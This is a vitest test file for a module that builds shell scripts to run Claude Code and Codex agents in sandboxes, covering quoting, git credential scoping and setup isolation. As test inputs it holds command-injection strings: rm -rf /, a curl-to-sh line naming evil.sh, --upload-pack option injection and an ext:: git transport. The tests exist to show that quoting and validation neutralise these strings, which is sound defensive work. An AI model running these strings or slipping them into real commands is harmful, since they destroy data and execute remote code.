import { execFileSync } from "node:child_process";

import { describe, expect, it } from "vitest";

import {
    AGENT_KEY_PATH,
    agentEnv,
    buildAgentCommand,
    buildAgentPrompt,
    buildInstallCommand,
    buildPollCommand,
    buildPullRequestScript,
    buildRunScript,
    CODEX_LAST_MESSAGE_PATH,
    CODING_AGENTS,
    GIT_AUTH_PATH,
    KEY_WANTED_PATH,
    parsePullRequestStatus,
    parseRunStatus,
    PROMPT_PATH,
    REPO_SETUP_FILE,
    SETUP_LOG_PATH,
    SETUP_TIMEOUT_S,
    SETUP_USER,
    buildCloneCommand,
    buildCommitCommand,
    buildDiffCommand,
    buildPushCommand,
    GITHUB_CREDENTIAL_ORIGIN,
    credentialFor,
    extraheaderKey,
    githubBasicCredential,
    gitAuthEnv,
    isValidBranchName,
    parseRepoUrl,
    prBranchName,
    shellJoin,
    shellQuote,
} from "./commands";
import { fakeKey } from "./test-fixtures";

/**
 * These scripts run in Linux E2B sandboxes, so the cases that hand them to a real
 * bash skip on Windows, which has no `/bin/bash`. The string assertions still run there.
 */
const NO_BASH = process.platform === "win32";

/** What bash actually receives: run the command through `printf` and read back each argument. */
const bashArgv = (quotedArgs: string): string[] => {
    const output = execFileSync("/bin/bash", ["-c", String.raw`printf '%s\0' ${quotedArgs}`], { encoding: "utf8" });

    return output.split("\0").slice(0, -1);
};

const CODEX_PREFIX = /^'codex' /u;
const STDIN_SUFFIX = / < \S+$/u;
const PR_AUTH_SUBSHELL = /\( export GIT_CONFIG_COUNT=1 /gu;
const EXACT_VERSION = /^\d+\.\d+\.\d+$/u;
const SUBSHELL_EXPORT = /\( if \[ -s \S+ \]; then export GIT_CONFIG_COUNT=1/u;
const FAKE_GITHUB_TOKEN = fakeKey("github");
const NUL_ERROR = /NUL/u;
const CASE_END = / ;;$/u;
const FINISH_CALL = /finish \S+/gu;
const BRANCH_ERROR = /branch/u;
const PR_BRANCH = /^neore\/agent-[a-z0-9]{1,12}$/u;

const HOSTILE = [
    "it's",
    "'; rm -rf / #",
    "$(curl evil.sh | sh)",
    "`id`",
    ["$HOME $", "{PATH}"].join(""),
    String.raw`double " quote \ backslash`,
    "line\nbreak",
    "-rf",
    "--",
    "glob * ? [a]",
    "",
    "semi;colon && and || or | pipe > redirect < in",
    "unicode ✓ ünïcødé",
];

const QUOTED = /^'.*'$/u;

describe("shellQuote", () => {
    it.skipIf(NO_BASH).each(HOSTILE)("round-trips %j through bash unchanged", (value) => {
        expect(bashArgv(shellQuote(value))).toEqual([value]);
    });

    it.skipIf(NO_BASH)("keeps a joined argv as separate arguments", () => {
        expect(bashArgv(shellJoin(HOSTILE))).toEqual(HOSTILE);
    });

    it("refuses a NUL byte instead of truncating", () => {
        expect(() => shellQuote("a\0b")).toThrow(NUL_ERROR);
    });
});

describe("buildAgentCommand", () => {
    it("runs claude bare, non-interactive, bypassing prompts, prompt read from the file", () => {
        const command = buildAgentCommand("claude_code");

        expect(command).toBe(
            `claude --bare -p "$(cat ${PROMPT_PATH})" '--output-format' 'stream-json' '--verbose' '--permission-mode' 'bypassPermissions' '--no-session-persistence'`,
        );
    });

    it.skipIf(NO_BASH)("runs codex exec with no approvals or inner sandbox", () => {
        const argv = bashArgv(buildAgentCommand("codex").replace(CODEX_PREFIX, "").replace(STDIN_SUFFIX, ""));

        expect(argv).toEqual([
            "exec",
            "--dangerously-bypass-approvals-and-sandbox",
            "--skip-git-repo-check",
            "--ephemeral",
            "--ignore-user-config",
            "-C",
            "/home/user/repo",
            "-o",
            "/tmp/neore-agent-last-message.txt",
            "-",
        ]);
    });

    it("feeds codex the prompt on stdin", () => {
        expect(buildAgentCommand("codex").endsWith(`< ${PROMPT_PATH}`)).toBe(true);
    });

    it("never puts the prompt or a secret in the command line", () => {
        // The script's environment carries no key either: the key is a file the poller writes after repository setup.
        expect(agentEnv("claude_code")).not.toHaveProperty("ANTHROPIC_API_KEY");
        expect(agentEnv("codex")).not.toHaveProperty("CODEX_API_KEY");

        // The builders never receive a key, so none can appear.
        for (const agent of ["claude_code", "codex"] as const) {
            expect(buildAgentCommand(agent)).not.toContain("not-real");
            expect(buildRunScript({ agent, repo: parseRepoUrl("a/b"), timeoutSeconds: 600 })).not.toContain("not-real");
        }
    });

    it("names neore as Claude Code's entrypoint, and only for Claude Code", () => {
        expect(agentEnv("claude_code")["CLAUDE_CODE_ENTRYPOINT"]).toBe("neore");
        expect(agentEnv("codex")).not.toHaveProperty("CLAUDE_CODE_ENTRYPOINT");
        expect(buildAgentCommand("claude_code")).not.toContain("CLAUDE_CODE_ENTRYPOINT");
    });

    it("keeps the prompt from starting with a dash", () => {
        expect(buildAgentPrompt("-rf /").startsWith("-")).toBe(false);
    });
});

describe("buildInstallCommand", () => {
    it("installs the pinned version into the user prefix", () => {
        expect(buildInstallCommand("claude_code")).toContain(`'@anthropic-ai/claude-code@${CODING_AGENTS.claude_code.npmVersion}'`);
        expect(buildInstallCommand("codex")).toContain(`'@openai/codex@${CODING_AGENTS.codex.npmVersion}'`);
        expect(CODING_AGENTS.claude_code.npmVersion).toMatch(EXACT_VERSION);
        expect(CODING_AGENTS.codex.npmVersion).toMatch(EXACT_VERSION);
    });
});

describe("buildRunScript", () => {
    const script = buildRunScript({ agent: "claude_code", branch: "main", repo: parseRepoUrl("a/b"), timeoutSeconds: 1080 });

    it.skipIf(NO_BASH)("is valid bash", () => {
        expect(() => execFileSync("/bin/bash", ["-n"], { input: script })).not.toThrow();
    });

    const setupLine = script.split("\n").find((line) => line.includes(`sudo -n -u ${SETUP_USER}`)) ?? "";

    it("clones, installs, runs the repository's setup, then runs the agent under what is left of the budget", () => {
        const clone = script.indexOf("git' 'clone'");
        const install = script.indexOf("npm ls -g");
        const setup = script.indexOf(setupLine);
        const keyWanted = script.indexOf(`touch ${KEY_WANTED_PATH}`);
        const agent = script.indexOf('timeout "$agent_s" claude --bare');

        expect(clone).toBeGreaterThan(0);
        expect(install).toBeGreaterThan(clone);
        expect(setupLine).not.toBe("");
        expect(setup).toBeGreaterThan(install);
        expect(keyWanted).toBeGreaterThan(setup);
        expect(agent).toBeGreaterThan(keyWanted);
        expect(script).toContain("agent_s=$((1080 - SECONDS))");
        expect(script).toContain('finish "agent:$?"');
    });

    it("hands the GitHub credential to git only, and deletes it before setup and the agent", () => {
        const firstDelete = script.indexOf(`rm -f ${GIT_AUTH_PATH}`);

        expect(firstDelete).toBeGreaterThan(0);
        expect(firstDelete).toBeLessThan(script.indexOf(setupLine));
        // Exported inside the clone's subshell, never at the top level.
        expect(script).toMatch(SUBSHELL_EXPORT);
    });

    it("runs setup as its own user, in an empty environment with the neore hints, under its own timeout and log", () => {
        expect(setupLine).toContain(`timeout -k 10 ${String(SETUP_TIMEOUT_S)} sudo -n -u ${SETUP_USER} -- env -i `);
        expect(setupLine).toContain("NEORE=1 NEORE_SETUP=fresh");
        expect(setupLine).toContain(`> ${SETUP_LOG_PATH} 2>&1 < /dev/null`);
        expect(setupLine).toContain(`exec ./${REPO_SETUP_FILE}; else exec bash ./${REPO_SETUP_FILE}`);
        // No key, no credential, no inherited variable: `env -i` and nothing of the agent's.
        expect(setupLine).not.toContain("API_KEY");
        expect(setupLine).not.toContain("extraheader");
        expect(setupLine).not.toContain(AGENT_KEY_PATH);
        // `.git` stays the sandbox user's, so setup cannot plant hooks the agent's git would run.
        expect(script).toContain(`sudo -n chown -R "$(id -u):$(id -g)" /home/user/repo/.git`);
    });

    it("kills what setup left running, takes the repository back and checks .git before the key is requested", () => {
        const keyWanted = script.indexOf(`touch ${KEY_WANTED_PATH}`);
        const afterSetup = script.slice(script.indexOf(setupLine), keyWanted);

        expect(afterSetup).toContain(`sudo -n pkill -KILL -u ${SETUP_USER}`);
        expect(afterSetup).toContain(`sudo -n pgrep -u ${SETUP_USER} >/dev/null && finish setup-failed:repo-setup`);
        expect(afterSetup).toContain(`timeout 180 sudo -n chown -R "$(id -u):$(id -g)" /home/user/repo || finish setup-failed:repo-setup`);
        // Owning the working tree is enough to swap `.git` for one whose config runs a command.
        expect(script.indexOf("git_id=$(stat -c %i:%u .git)")).toBeLessThan(script.indexOf(setupLine));
        expect(afterSetup).toContain('[ "$(stat -c %i:%u .git 2>/dev/null)" = "$git_id" ] || finish setup-failed:repo-setup');
        // A file the agent writes later exists before setup, so setup cannot own it.
        expect(script.indexOf(`: > ${CODEX_LAST_MESSAGE_PATH}`)).toBeLessThan(script.indexOf(setupLine));
    });

    it("lets a failed or timed-out setup through to the agent, with a note, and skips setup without sudo", () => {
        const afterSetup = script.slice(script.indexOf(setupLine), script.indexOf(`touch ${KEY_WANTED_PATH}`));

        // The only way setup ends the run: the repository could not be taken back safely.
        expect(afterSetup.match(FINISH_CALL)).toEqual(["finish setup-failed:repo-setup", "finish setup-failed:repo-setup", "finish setup-failed:repo-setup"]);
        expect(afterSetup).toContain("124 | 137)");
        expect(afterSetup).toContain(`>> ${PROMPT_PATH}`);
        expect(afterSetup).toContain("the agent starts anyway");
        expect(script).toContain("repository setup skipped");
    });

    it("gives the key to the agent's command alone, and deletes its file first", () => {
        const read = script.indexOf(`agent_key=$(cat ${AGENT_KEY_PATH}); rm -f ${AGENT_KEY_PATH}`);

        expect(read).toBeGreaterThan(script.indexOf(`touch ${KEY_WANTED_PATH}`));
        expect(script).toContain('ANTHROPIC_API_KEY="$agent_key" timeout "$agent_s" claude --bare');
        expect(script).not.toContain("export ANTHROPIC_API_KEY");
        expect(script).toContain("finish setup-failed:agent-key");
    });

    it("leaves repository setup out when asked, keeping the key hand-off", () => {
        const skipped = buildRunScript({ agent: "claude_code", repo: parseRepoUrl("a/b"), skipRepoSetup: true, timeoutSeconds: 1080 });

        expect(skipped).not.toContain(`sudo -n -u ${SETUP_USER}`);
        expect(skipped).not.toContain("setup-failed:repo-setup");
        expect(skipped).toContain(`repository setup (${REPO_SETUP_FILE}) skipped for this run`);
        expect(skipped).toContain(`touch ${KEY_WANTED_PATH}`);
        expect(buildRunScript({ agent: "claude_code", repo: parseRepoUrl("a/b"), skipRepoSetup: false, timeoutSeconds: 1080 })).toBe(
            buildRunScript({ agent: "claude_code", repo: parseRepoUrl("a/b"), timeoutSeconds: 1080 }),
        );
    });

    it.skipIf(NO_BASH)("writes the setup notes to the prompt with real newlines", () => {
        const noteLine = script.split("\n").find((line) => line.includes("printf") && line.includes(PROMPT_PATH)) ?? "";
        const output = execFileSync("/bin/bash", ["-c", `setup_exit=0; ${noteLine.trim().replace(`>> ${PROMPT_PATH}`, "").replace(CASE_END, "")}`], {
            encoding: "utf8",
        });

        expect(output).toBe(
            `\n\nThe repository's setup script (${REPO_SETUP_FILE}) ran before you started (exit code 0); its output is in ${SETUP_LOG_PATH}.\n`,
        );
    });

    it("parses the status the script writes", () => {
        expect(parseRunStatus("agent:0\n")).toEqual({ exitCode: 0, kind: "agent" });
        expect(parseRunStatus("agent:124")).toEqual({ exitCode: 124, kind: "agent" });
        expect(parseRunStatus("setup-failed:clone")).toEqual({ kind: "setup-failed", step: "clone" });
        expect(parseRunStatus("setup-failed:repo-setup")).toEqual({ kind: "setup-failed", step: "repo-setup" });
        expect(parseRunStatus("setup-failed:agent-key")).toEqual({ kind: "setup-failed", step: "agent-key" });
        expect(parseRunStatus("")).toBeUndefined();
    });

    it("only polls from a valid offset", () => {
        expect(() => buildPollCommand(-1)).toThrow();
        expect(buildPollCommand(10)).toContain("tail -c +11");
        expect(buildPollCommand(0)).toContain(`[ -e ${KEY_WANTED_PATH} ] && [ ! -e ${AGENT_KEY_PATH} ]`);
    });
});

describe("parseRepoUrl", () => {
    it("normalises GitHub URLs and shorthand", () => {
        expect(parseRepoUrl("anolilab/neore")).toEqual({
            cloneUrl: "https://github.com/anolilab/neore.git",
            github: { owner: "anolilab", repo: "neore" },
            host: "github.com",
            origin: GITHUB_CREDENTIAL_ORIGIN,
        });
        expect(parseRepoUrl("https://github.com/anolilab/neore.git").cloneUrl).toBe("https://github.com/anolilab/neore.git");
        expect(parseRepoUrl("https://github.com/anolilab/neore/").github).toEqual({ owner: "anolilab", repo: "neore" });
        expect(parseRepoUrl("https://github.com/anolilab/neore.git/").cloneUrl).toBe("https://github.com/anolilab/neore.git");
    });

    it("accepts other https hosts without a GitHub identity", () => {
        expect(parseRepoUrl("https://gitlab.com/group/project.git")).toEqual({
            cloneUrl: "https://gitlab.com/group/project.git",
            host: "gitlab.com",
            origin: "https://gitlab.com",
        });
    });

    it.each([
        ["ssh transport", "ssh://git@github.com/a/b.git"],
        ["git ext transport", "ext::sh -c touch% /tmp/pwned"],
        ["file transport", "file:///etc"],
        ["plain http", ["http:", "//github.com/a/b"].join("")],
        ["embedded credentials", "https://user:token@github.com/a/b.git"],
        ["query string", "https://github.com/a/b?x=1"],
        ["deep GitHub path", "https://github.com/a/b/tree/main"],
        ["option-looking owner", "https://github.com/-a/b"],
    ])("rejects %s", (_label, url) => {
        expect(() => parseRepoUrl(url)).toThrow();
    });
});

describe("branches", () => {
    it.each(["main", "feature/x-1", "release/2.0"])("accepts %s", (branch) => {
        expect(isValidBranchName(branch)).toBe(true);
    });

    it.each(["--upload-pack=evil", "-b", "a..b", "a b", "a;b", "/abs", "x.lock", "", "foo//bar", "foo/.hidden", ".hidden", "foo.lock/bar", "foo."])(
        "rejects %j",
        (branch) => {
            expect(isValidBranchName(branch)).toBe(false);
        },
    );

    it("refuses an invalid branch in the clone command", () => {
        expect(() => buildCloneCommand(parseRepoUrl("a/b"), "--upload-pack=touch /tmp/x")).toThrow(BRANCH_ERROR);
    });

    it("derives the PR branch from the run id only", () => {
        expect(prBranchName("k57abc/../DEF123xyz")).toMatch(PR_BRANCH);
        expect(isValidBranchName(prBranchName("k57abcDEF123xyz"))).toBe(true);
    });
});

describe("git credentials", () => {
    it("injects the token only through GIT_CONFIG_* env", () => {
        const env = gitAuthEnv(FAKE_GITHUB_TOKEN);

        expect(env["GIT_CONFIG_KEY_0"]).toBe("http.https://github.com/.extraheader");
        expect(env["GIT_CONFIG_VALUE_0"]).toBe(`AUTHORIZATION: basic ${githubBasicCredential(FAKE_GITHUB_TOKEN)}`);
        expect(buildCloneCommand(parseRepoUrl("a/b"))).not.toContain(FAKE_GITHUB_TOKEN);
        expect(buildPushCommand("neore/agent-x")).not.toContain(FAKE_GITHUB_TOKEN);
    });

    it("sends no auth config without a token", () => {
        expect(gitAuthEnv(undefined)).toEqual({ GIT_TERMINAL_PROMPT: "0" });
    });

    it("disables hooks on the commit and the push", () => {
        expect(buildCommitCommand("neore/agent-x", "msg")).toContain("'core.hooksPath=/dev/null'");
        expect(buildPushCommand("neore/agent-x")).toContain("'core.hooksPath=/dev/null'");
    });

    it("quotes the commit message", () => {
        expect(buildCommitCommand("neore/agent-x", "fix'; rm -rf /; '")).toContain(String.raw`'fix'\''; rm -rf /; '\'''`);
    });

    it("keeps the agent as author by default", () => {
        const command = buildCommitCommand("neore/agent-x", "msg");

        expect(command).toContain("user.name=Neore Agent");
        expect(command).toContain("user.email=agent@users.noreply.neore.chat");
        expect(command).not.toContain("Co-authored-by");
    });

    it("makes the commit as the person and names the agent as co-author", () => {
        const command = buildCommitCommand("neore/agent-x", "msg", { email: "dana@example.com", name: "Dana Tester" });

        expect(command).toContain("user.name=Dana Tester");
        expect(command).toContain("user.email=dana@example.com");
        expect(command).toContain("Co-authored-by: Neore Agent <agent@users.noreply.neore.chat>");
        expect(command).not.toContain("user.name=Neore Agent");
    });
});

describe("origin-scoped credentials", () => {
    it("records the origin a repository is on", () => {
        expect(parseRepoUrl("anolilab/neore").origin).toBe(GITHUB_CREDENTIAL_ORIGIN);
        expect(parseRepoUrl("https://github.com/octo/hello.git").origin).toBe(GITHUB_CREDENTIAL_ORIGIN);
        expect(parseRepoUrl("https://git.example:8443/octo/hello.git").origin).toBe("https://git.example:8443");
    });

    it("keys the git extraheader on the origin", () => {
        expect(extraheaderKey(GITHUB_CREDENTIAL_ORIGIN)).toBe("http.https://github.com/.extraheader");
        expect(gitAuthEnv(FAKE_GITHUB_TOKEN, "https://git.example:8443")).toMatchObject({
            GIT_CONFIG_KEY_0: "http.https://git.example:8443/.extraheader",
            GIT_CONFIG_VALUE_0: `AUTHORIZATION: basic ${githubBasicCredential(FAKE_GITHUB_TOKEN)}`,
        });
    });

    it("gives the credential to the origin the token was saved for alone", () => {
        const github = parseRepoUrl("anolilab/neore");

        expect(credentialFor(FAKE_GITHUB_TOKEN, github)).toBe(githubBasicCredential(FAKE_GITHUB_TOKEN));
        expect(credentialFor(FAKE_GITHUB_TOKEN, parseRepoUrl("https://git.example.com/octo/hello.git"))).toBeUndefined();
        expect(credentialFor(FAKE_GITHUB_TOKEN, github, "https://git.example:8443")).toBeUndefined();
    });

    it("sends no auth config without a token, and never over plaintext http", () => {
        // eslint-disable-next-line unicorn/prefer-https -- the case IS a cleartext origin: it must never receive the credential.
        expect(gitAuthEnv(FAKE_GITHUB_TOKEN, "http://git.example")).toEqual({ GIT_TERMINAL_PROMPT: "0" });
    });

    it("binds the scripts' credential to the repository's own origin", () => {
        const onGithub = buildRunScript({ agent: "claude_code", repo: parseRepoUrl("a/b"), timeoutSeconds: 600 });
        const offGithub = buildRunScript({ agent: "claude_code", repo: parseRepoUrl("https://git.example.com/octo/hello.git"), timeoutSeconds: 600 });
        const prOnGithub = buildPullRequestScript({ baseBranch: "main", branch: "neore/agent-run1", message: "m", repo: parseRepoUrl("a/b") });
        const prOffGithub = buildPullRequestScript({
            baseBranch: "main",
            branch: "neore/agent-run1",
            message: "m",
            repo: parseRepoUrl("https://git.example.com/octo/hello.git"),
        });

        expect(onGithub).toContain(extraheaderKey(GITHUB_CREDENTIAL_ORIGIN));
        expect(offGithub).toContain(extraheaderKey("https://git.example.com"));
        expect(prOnGithub).toContain(extraheaderKey(GITHUB_CREDENTIAL_ORIGIN));
        expect(prOffGithub).toContain(extraheaderKey("https://git.example.com"));
        expect(offGithub).not.toContain(GITHUB_CREDENTIAL_ORIGIN);
        expect(prOffGithub).not.toContain(GITHUB_CREDENTIAL_ORIGIN);
    });

    it("quotes the credential key in both scripts, so an origin cannot add shell words", () => {
        const origin = "https://git.example.com";
        const key = `GIT_CONFIG_KEY_0=${shellQuote(extraheaderKey(origin))}`;
        const run = buildRunScript({ agent: "claude_code", repo: parseRepoUrl("https://git.example.com/octo/hello.git"), timeoutSeconds: 600 });
        const pr = buildPullRequestScript({
            baseBranch: "main",
            branch: "neore/agent-run1",
            message: "m",
            repo: parseRepoUrl("https://git.example.com/octo/hello.git"),
        });

        expect(shellQuote("http.https://a b;x/.extraheader")).toMatch(QUOTED);
        expect(run).toContain(key);
        expect(pr).toContain(key);
    });
});

describe("buildPullRequestScript", () => {
    const script = buildPullRequestScript({ baseBranch: "main", branch: "neore/agent-run1", message: "fix'; rm -rf /", repo: parseRepoUrl("a/b") });

    it.skipIf(NO_BASH)("is valid bash", () => {
        expect(() => execFileSync("/bin/bash", ["-n"], { input: script })).not.toThrow();
    });

    it("clones, applies, commits and pushes in order, recording the outcome", () => {
        const steps = ["git' 'clone'", "git' 'apply'", "'commit'", "'push'", "finish pushed"].map((needle) => script.indexOf(needle));

        expect(steps.every((index) => index > 0)).toBe(true);
        expect(steps).toEqual([...steps].toSorted((a, b) => a - b));
    });

    it("reads the credential only inside the clone and push subshells, and deletes it on every exit", () => {
        expect(script.match(PR_AUTH_SUBSHELL)).toHaveLength(2);
        expect(script).toContain(`finish() { rm -f ${GIT_AUTH_PATH};`);
    });

    it("quotes the commit message", () => {
        expect(script).toContain(String.raw`'fix'\''; rm -rf /'`);
    });

    it("parses the status the script writes", () => {
        expect(parsePullRequestStatus("pushed\n")).toEqual({ kind: "pushed" });
        expect(parsePullRequestStatus("failed:push")).toEqual({ kind: "failed", step: "push" });
        expect(parsePullRequestStatus("")).toBeUndefined();
    });
});

describe("buildDiffCommand", () => {
    it("only takes a full commit sha", () => {
        expect(() => buildDiffCommand("HEAD; rm -rf /")).toThrow();
        expect(buildDiffCommand("a".repeat(40))).toContain(`--binary ${"a".repeat(40)}`);
    });
});
